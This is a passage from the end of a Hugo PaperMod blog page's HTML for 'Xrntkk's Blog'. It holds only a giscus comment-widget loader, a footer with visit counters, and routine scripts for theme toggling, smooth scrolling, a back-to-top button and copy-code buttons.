    const setGiscusTheme = () => {
        const sendMessage = (message) => {
            const iframe = document.querySelector('iframe.giscus-frame');
            if (iframe) {
                iframe.contentWindow.postMessage({giscus: message}, 'https://giscus.app');
            }
        }
        sendMessage({setConfig: {theme: getStoredTheme()}})
    }

    document.addEventListener("DOMContentLoaded", () => {
        const giscusAttributes = {
            "src": "https://giscus.app/client.js",
            "data-repo": "sonnycalcr\/sonnycalcr.github.io",
            "data-repo-id": "xxxxxx",
            "data-category": "Announcements",
            "data-category-id": "xxxxx",
            "data-mapping": "pathname",
            "data-strict": "0",
            "data-reactions-enabled": "1",
            "data-emit-metadata": "0",
            "data-input-position": "bottom",
            "data-theme": getStoredTheme(),
            "data-lang": "zh-CN",
            "data-loading": "lazy",
            "crossorigin": "anonymous",
        };

        
        const giscusScript = document.createElement("script");
        Object.entries(giscusAttributes).forEach(
                ([key, value]) => giscusScript.setAttribute(key, value));
        document.querySelector("#tw-comment").appendChild(giscusScript);

        
        const themeSwitcher = document.querySelector("#theme-toggle");
        if (themeSwitcher) {
            themeSwitcher.addEventListener("click", setGiscusTheme);
        }
        const themeFloatSwitcher = document.querySelector("#theme-toggle-float");
        if (themeFloatSwitcher) {
            themeFloatSwitcher.addEventListener("click", setGiscusTheme);
        }
    });
</script>
</article>
    </main>
    
<footer class="footer">
        <span><a href="https://blog.xrntkk.top/">©2024 Xrntkk&rsquo;s Blog</a></span> · 


    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
    <div class="busuanzi-footer">
    <span id="busuanzi_container_site_pv">
        Total Visits: <span id="busuanzi_value_site_pv"></span> & 
    </span>
    <span id="busuanzi_container_site_uv">
        Unique Visitor: <span id="busuanzi_value_site_uv"></span>
    </span>
    </div></footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = '复制';

        function copyingDone() {
            copybutton.innerHTML = '已复制！';
            setTimeout(() => {
                copybutton.innerHTML = '复制';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
